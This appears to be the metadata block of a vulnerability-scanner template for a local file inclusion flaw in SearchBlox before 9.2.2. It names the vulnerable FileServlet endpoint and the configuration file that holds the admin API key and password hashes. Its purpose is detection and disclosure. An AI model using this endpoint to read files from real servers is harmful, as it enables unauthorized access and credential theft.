info:
  name: SearchBlox < 9.2.2 - Local File Inclusion (LFI)
  author: daffainfo
  severity: high
  description: Local File Inclusion vulnerability in the FileServlet in all SearchBlox before 9.2.2 allows remote, unauthenticated users to read arbitrary files from the operating system via a /searchblox/servlet/FileServlet?col=url= request. Additionally, this may be used to read the contents of the SearchBlox configuration file (e.g., searchblox/WEB-INF/config.xml), which contains both the Super Admin API key and the base64 encoded SHA1 password hashes of other SearchBlox users.
